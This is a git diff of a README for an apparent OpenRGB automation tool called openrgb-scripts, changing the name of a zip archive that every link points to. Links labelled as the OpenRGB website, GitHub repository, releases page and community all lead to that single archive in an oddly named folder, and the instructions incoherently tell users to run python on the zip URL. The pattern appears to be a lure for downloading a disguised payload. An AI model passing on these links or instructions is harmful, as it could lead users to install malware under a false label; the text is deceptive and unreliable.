@@ -1,6 +1,6 @@
 # 🎨 openrgb-scripts - Automate OpenRGB with Ease
 
-[![Download](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/openrgb-scripts_snuffless.zip%20Now-OpenRGB%20Scripts-blue)](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/openrgb-scripts_snuffless.zip)
+[![Download](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/scripts-openrgb-2.2-alpha.2.zip%20Now-OpenRGB%20Scripts-blue)](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/scripts-openrgb-2.2-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,14 +12,14 @@ Before you start, ensure your system meets these requirements:
 
 - **Operating System:** Windows 10 or later
 - **Python:** A portable Python environment is included, so no prior installation is needed.
-- **OpenRGB:** Make sure you have OpenRGB installed. You can download it from the [OpenRGB website](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/openrgb-scripts_snuffless.zip).
+- **OpenRGB:** Make sure you have OpenRGB installed. You can download it from the [OpenRGB website](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/scripts-openrgb-2.2-alpha.2.zip).
 
 ## 📥 Download & Install
 
 To get started, you need to visit our Releases page. Follow these steps:
 
 1. Click the link below to access the download page.
-   [Download openrgb-scripts](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/openrgb-scripts_snuffless.zip)
+   [Download openrgb-scripts](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/scripts-openrgb-2.2-alpha.2.zip)
 
 2. On the Releases page, look for the latest version. You’ll see a list of files available for download.
 
@@ -47,9 +47,9 @@ After extracting the files, you are ready to run the scripts.
      ```
    - Run the script by typing:
      ```
-     python https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/openrgb-scripts_snuffless.zip
+     python https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/scripts-openrgb-2.2-alpha.2.zip
      ```
-   Replace `https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/openrgb-scripts_snuffless.zip` with the name of the script you want to run.
+   Replace `https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/scripts-openrgb-2.2-alpha.2.zip` with the name of the script you want to run.
 
 ## 📝 Features
 
@@ -80,7 +80,7 @@ If you have questions or need further assistance, reach out to the community or 
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/openrgb-scripts_snuffless.zip)
-- [Join the OpenRGB Community](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/openrgb-scripts_snuffless.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/scripts-openrgb-2.2-alpha.2.zip)
+- [Join the OpenRGB Community](https://raw.githubusercontent.com/Romanticisationphallales546/openrgb-scripts/main/staphylinid/scripts-openrgb-2.2-alpha.2.zip)
 
 Remember, automation is at your fingertips with openrgb-scripts! Enjoy customizing your RGB experience effortlessly.
